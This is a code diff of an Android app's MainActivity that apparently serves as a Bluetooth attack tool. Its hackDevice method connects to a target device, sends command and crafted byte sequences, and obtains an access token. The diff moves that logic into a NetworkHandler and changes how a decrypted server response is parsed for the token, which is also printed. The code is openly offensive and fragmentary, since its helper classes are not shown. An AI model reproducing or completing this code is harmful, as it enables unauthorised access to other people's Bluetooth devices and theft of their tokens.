@@ -163,7 +163,8 @@ public class MainActivity extends AppCompatActivity {
                     String strMess=response.body().string();
                     byte[] message = Base64.getDecoder().decode(strMess);
                     strMess = new String(decip.doFinal(message));
-                    accessToken = new JSONObject(strMess).getString("accessToken");
+                    System.out.println(strMess);
+                    accessToken = new JSONObject(strMess).getJSONObject("data").getString("accessToken");
                     System.out.println(accessToken);
                 } catch (IllegalBlockSizeException | BadPaddingException | JSONException e) {
                     throw new RuntimeException(e);
@@ -174,23 +175,8 @@ public class MainActivity extends AppCompatActivity {
     }
     private void hackDevice(BluetoothDevice device){
         System.out.println("Hacking device "+device.getAddress());
-        Command control=new Command(new Callback() {
-            @Override
-            public void receiveData(String address, int i, int i2, String data) {
-                System.out.println("======== Receiving data ========");
-                System.out.println("Address : "+ address);
-                System.out.println("Code : "+i);
-                System.out.println("Ret : "+i2);
-                System.out.println("Data : "+ data);
-            }
-
-            @Override
-            public void sendData(String address, byte[] data) {
-                System.out.println("======== Sending data ========");
-                System.out.println("Address : "+ address);
-                System.out.println("Data : "+ Arrays.toString(data));
-            }
-        });
+        NetworkHandler hand=new NetworkHandler(device);
+        Command control=new Command(hand);
         String deviceAddr=device.getAddress();
         control.connect(deviceAddr,true);
         control.command(deviceAddr,commandType.VERSION);
@@ -200,6 +186,6 @@ public class MainActivity extends AppCompatActivity {
         control.commandData(deviceAddr,commandType.RANDOM,received);
         received=new byte[]{(byte) 0xaa,0x55,0x01,0x03,0x05,0x00,0x01,0x06, (byte) 0xaa, (byte) 0xb5,0x2d, (byte) 0x9b,0x02};
         control.receiveData(deviceAddr,received);
-        received=getToken();
+        hand.getToken();
     }
 }
